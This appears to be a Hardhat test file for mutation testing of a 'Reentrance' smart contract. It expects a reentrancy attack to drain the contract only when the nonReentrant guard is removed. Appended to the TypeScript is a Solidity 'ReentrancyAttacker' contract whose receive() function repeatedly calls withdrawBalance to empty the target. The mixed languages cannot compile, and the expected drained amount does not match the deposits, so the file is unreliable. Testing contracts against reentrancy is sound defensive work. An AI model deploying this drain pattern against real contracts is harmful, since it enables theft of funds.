import { expect } from "chai";
import { ethers } from "hardhat";

describe("Reentrance mutant kill test - reentrancy", function () {
  it("should kill mutant by performing reentrancy attack that succeeds on mutant but would fail on original", async function () {
    // Deploy the Reentrance contract (no constructor args)
    const [owner, attacker] = await ethers.getSigners();
    const Factory = await ethers.getContractFactory("Reentrance");
    const instance = await Factory.deploy();
    await instance.waitForDeployment();
    const instanceAddress = await instance.getAddress();

    // Fund the contract with some ether (e.g., from owner)
    await owner.sendTransaction({
      to: instanceAddress,
      value: ethers.parseEther("10")
    });

    // Deploy a malicious attacker contract that will perform reentrancy
    const AttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await AttackerFactory.deploy(instanceAddress);
    await attackerContract.waitForDeployment();

    // First, fund the attacker contract so it has a balance to withdraw
    await attacker.sendTransaction({
      to: await attackerContract.getAddress(),
      value: ethers.parseEther("1")
    });

    // Attacker contract calls addToBalance to register its balance
    await attackerContract.connect(attacker).addToBalance({ value: ethers.parseEther("1") });

    // Now trigger the attack - this should succeed on mutant (no reentrancy guard)
    // but would revert on original due to nonReentrant modifier
    const tx = attackerContract.connect(attacker).attack();

    // The attack should drain the contract balance if reentrancy is possible
    // On the original contract with nonReentrant, the attack would revert
    // On the mutant without nonReentrant, the attack should succeed
    await expect(tx).to.changeEtherBalance(
      attackerContract,
      ethers.parseEther("10") // contract had 10, attacker gets it all
    );

    // Verify the contract is drained
    const contractBalance = await ethers.provider.getBalance(instanceAddress);
    expect(contractBalance).to.equal(0);
  });
});

// Malicious contract for reentrancy attack
contract ReentrancyAttacker {
    Reentrance public target;
    address public owner;

    constructor(address _target) {
        target = Reentrance(_target);
        owner = msg.sender;
    }

    function addToBalance() external payable {
        target.addToBalance{value: msg.value}();
    }

    function attack() external {
        target.withdrawBalance();
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdrawBalance();
        }
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}